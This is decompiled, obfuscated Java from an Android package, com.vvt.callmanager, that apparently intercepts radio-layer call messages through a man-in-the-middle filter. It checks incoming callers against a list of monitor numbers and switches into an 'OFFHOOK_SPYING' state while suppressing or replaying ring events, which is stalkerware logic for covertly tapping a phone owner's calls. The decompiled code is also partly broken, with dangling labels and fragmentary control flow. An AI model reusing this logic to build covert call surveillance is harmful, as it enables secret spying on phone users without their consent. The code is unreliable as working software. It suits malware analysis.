package com.vvt.callmanager.filter;

import android.os.Parcel;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.mitm.a;
import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.f;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Set;

 enum FilterGsmCall$CallState$5
{
  private byte[] cacheUnsolCallRing;
  private ArrayList callList;
  private ArrayList lgStateInfo;
  
  FilterGsmCall$CallState$5()
  {
    super(paramString, paramInt, null);
  }
  
  private void a()
  {
    int i = 1;
    boolean bool1 = FilterGsmCall.b();
    if (bool1) {}
    Object localObject1 = this.callList;
    Iterator localIterator = ((ArrayList)localObject1).iterator();
    Object localObject2;
    do
    {
      boolean bool2;
      do
      {
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break label215;
          }
          localObject1 = (com.vvt.callmanager.a.d)localIterator.next();
          localObject2 = ((com.vvt.callmanager.a.d)localObject1).d();
          localObject3 = FilterGsmCall.d(this.mFilterCall);
          bool2 = ((f)localObject3).a((String)localObject2);
          boolean bool3 = FilterGsmCall.b();
          if ((bool3) && (!bool2)) {
            break;
          }
          bool1 = FilterGsmCall.b();
          if (!bool1) {}
        }
        localObject3 = sNotifiedList;
        bool2 = ((Set)localObject3).contains(localObject2);
      } while (bool2);
      localObject3 = sNotifiedList;
      ((Set)localObject3).add(localObject2);
      localObject2 = FilterGsmCall.f(this.mFilterCall);
    } while (localObject2 == null);
    Object localObject3 = new com/vvt/callmanager/ref/ActiveCallInfo;
    ((ActiveCallInfo)localObject3).<init>();
    int j = ((com.vvt.callmanager.a.d)localObject1).b();
    if (j == i) {
      j = i;
    }
    for (;;)
    {
      ((ActiveCallInfo)localObject3).setIncoming(j);
      localObject1 = ((com.vvt.callmanager.a.d)localObject1).d();
      ((ActiveCallInfo)localObject3).setNumber((String)localObject1);
      localObject1 = FilterGsmCall.f(this.mFilterCall);
      ((com.vvt.callmanager.mitm.d)localObject1).a((ActiveCallInfo)localObject3);
      break;
      int k = 0;
      localObject2 = null;
    }
    label215:
    bool1 = FilterGsmCall.b();
    if (bool1) {}
  }
  
  private boolean a(Parcel paramParcel)
  {
    Object localObject1 = l.a(paramParcel);
    int i = ((l)localObject1).b;
    int j = 134744072;
    boolean bool;
    Object localObject2;
    if (i == j)
    {
      localObject1 = this.lgStateInfo;
      bool = ((ArrayList)localObject1).isEmpty();
      if (!bool)
      {
        localObject1 = this.mFilterCall;
        localObject2 = this.lgStateInfo;
        FilterGsmCall.b((FilterGsmCall)localObject1, (ArrayList)localObject2);
        bool = false;
        localObject1 = null;
      }
    }
    for (;;)
    {
      return bool;
      localObject1 = this.mFilterCall;
      localObject2 = i.a(i.n);
      ((FilterGsmCall)localObject1).c((Parcel)localObject2);
      break;
      bool = true;
    }
  }
  
  public void onEnter(Object paramObject)
  {
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall.a(this.mFilterCall);
    bool = false;
    Object localObject1 = null;
    this.cacheUnsolCallRing = null;
    if (paramObject == null)
    {
      localObject1 = new java/util/ArrayList;
      ((ArrayList)localObject1).<init>();
      this.callList = ((ArrayList)localObject1);
    }
    for (;;)
    {
      localObject1 = this.lgStateInfo;
      if (localObject1 == null)
      {
        localObject1 = new java/util/ArrayList;
        ((ArrayList)localObject1).<init>();
        this.lgStateInfo = ((ArrayList)localObject1);
      }
      this.lgStateInfo.clear();
      localObject1 = this.mFilterCall;
      Object localObject2 = BugEngineCallState.GSM_OFFHOOK;
      FilterGsmCall.a((FilterGsmCall)localObject1, (BugEngineCallState)localObject2);
      return;
      paramObject = (Parcel)paramObject;
      localObject1 = com.vvt.callmanager.a.d.a((Parcel)paramObject);
      this.callList = ((ArrayList)localObject1);
      localObject1 = "FilterCall";
      localObject2 = this.callList;
      a locala = FilterGsmCall.c(this.mFilterCall).a();
      i.a((String)localObject1, (ArrayList)localObject2, locala);
      a();
    }
  }
  
  public Object onExit()
  {
    boolean bool = FilterGsmCall.b();
    if (bool) {}
    FilterGsmCall.b(this.mFilterCall);
    return this.callList;
  }
  
  public FilterGsmCall.CallState processResponse(Parcel paramParcel)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    Object localObject1 = null;
    Object localObject2 = FilterGsmCall.c(this.mFilterCall);
    int i = ((m)localObject2).c(paramParcel);
    int j = 9;
    Object localObject3;
    Object localObject4;
    Object localObject5;
    if (i == j)
    {
      localObject2 = com.vvt.callmanager.a.d.a(paramParcel);
      this.callList = ((ArrayList)localObject2);
      localObject3 = this.callList;
      localObject4 = FilterGsmCall.c(this.mFilterCall).a();
      i.a("FilterCall", (ArrayList)localObject3, (a)localObject4);
      localObject2 = this.callList;
      i = ((ArrayList)localObject2).size();
      if (i == 0)
      {
        localObject5 = this.mFilterCall;
        localObject1 = "There is no active call -> Go IDLE";
        FilterGsmCall.a((FilterGsmCall)localObject5, (String)localObject1);
        localObject5 = IDLE;
        bool2 = a(paramParcel);
      }
    }
    for (;;)
    {
      if (bool2)
      {
        localObject1 = this.mFilterCall;
        ((FilterGsmCall)localObject1).c(paramParcel);
      }
      return (FilterGsmCall.CallState)localObject5;
      localObject2 = this.mFilterCall;
      localObject3 = this.callList;
      localObject2 = FilterGsmCall.a((FilterGsmCall)localObject2, (ArrayList)localObject3);
      if (localObject2 == null)
      {
        bool1 = a(paramParcel);
        localObject1 = this;
      }
      for (;;)
      {
        localObject5 = localObject1;
        bool2 = bool1;
        break;
        localObject2 = ((com.vvt.callmanager.a.d)localObject2).d();
        localObject3 = this.mFilterCall;
        localObject4 = "Get calling from: %s";
        localObject5 = new Object[bool1];
        localObject5[0] = localObject2;
        localObject5 = String.format((String)localObject4, (Object[])localObject5);
        FilterGsmCall.a((FilterGsmCall)localObject3, (String)localObject5);
        localObject5 = FilterGsmCall.d(this.mFilterCall).b((String)localObject2);
        if (localObject5 == null) {
          break label291;
        }
        bool1 = ((MonitorNumber)localObject5).isEnabled();
        if (!bool1) {
          break label291;
        }
        localObject5 = this.mFilterCall;
        localObject2 = "Found monitor!!";
        FilterGsmCall.a((FilterGsmCall)localObject5, (String)localObject2);
        localObject5 = OFFHOOK_SPYING;
        localObject1 = localObject5;
        bool1 = false;
        localObject5 = null;
      }
      label291:
      localObject5 = this.lgStateInfo;
      bool1 = ((ArrayList)localObject5).isEmpty();
      if (!bool1)
      {
        localObject5 = this.mFilterCall;
        localObject2 = this.lgStateInfo;
        FilterGsmCall.b((FilterGsmCall)localObject5, (ArrayList)localObject2);
      }
      for (;;)
      {
        localObject5 = OFFHOOK_RINGING;
        break;
        localObject5 = this.mFilterCall;
        localObject2 = this.cacheUnsolCallRing;
        i.a((n)localObject5, (byte[])localObject2);
      }
      j = 1001;
      if (i == j)
      {
        localObject5 = this.lgStateInfo;
        bool1 = ((ArrayList)localObject5).isEmpty();
        if (!bool1)
        {
          localObject5 = this.lgStateInfo;
          localObject2 = paramParcel.marshall();
          ((ArrayList)localObject5).add(localObject2);
        }
        localObject5 = this.lgStateInfo;
        bool1 = ((ArrayList)localObject5).isEmpty();
        if (!bool1)
        {
          localObject5 = this.mFilterCall;
          localObject2 = this.callList;
          localObject3 = this.lgStateInfo;
          bool1 = FilterGsmCall.a((FilterGsmCall)localObject5, (ArrayList)localObject2, (ArrayList)localObject3);
          if (!bool1) {}
        }
        else
        {
          localObject5 = FilterGsmCall.c(this.mFilterCall);
          localObject2 = this.mFilterCall;
          i.a((m)localObject5, (n)localObject2);
        }
        localObject5 = this;
      }
      else
      {
        localObject3 = this.mFilterCall;
        boolean bool3 = FilterGsmCall.a((FilterGsmCall)localObject3, paramParcel, i);
        if (bool3)
        {
          localObject5 = this.mFilterCall;
          localObject2 = "Found incoming call -> Wait for checking ...";
          FilterGsmCall.a((FilterGsmCall)localObject5, (String)localObject2);
          localObject5 = this.lgStateInfo;
          bool1 = ((ArrayList)localObject5).isEmpty();
          if (!bool1)
          {
            localObject5 = this.lgStateInfo;
            localObject2 = paramParcel.marshall();
            ((ArrayList)localObject5).add(localObject2);
          }
          for (;;)
          {
            localObject5 = this;
            break;
            localObject5 = paramParcel.marshall();
            this.cacheUnsolCallRing = ((byte[])localObject5);
          }
        }
        int k = 1049;
        if (i == k)
        {
          localObject5 = this.lgStateInfo;
          localObject2 = paramParcel.marshall();
          ((ArrayList)localObject5).add(localObject2);
          localObject5 = this;
        }
        else
        {
          bool2 = bool1;
          localObject5 = this;
        }
      }
    }
  }
  
  public FilterGsmCall.CallState processRilRequest(Parcel paramParcel)
  {
    Object localObject = FilterGsmCall.c(this.mFilterCall);
    int i = ((m)localObject).b(paramParcel);
    int j = 10;
    if (i == j) {}
    for (localObject = OFFHOOK_DIALING;; localObject = this)
    {
      this.mFilterCall.d(paramParcel);
      return (FilterGsmCall.CallState)localObject;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterGsmCall$CallState$5.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */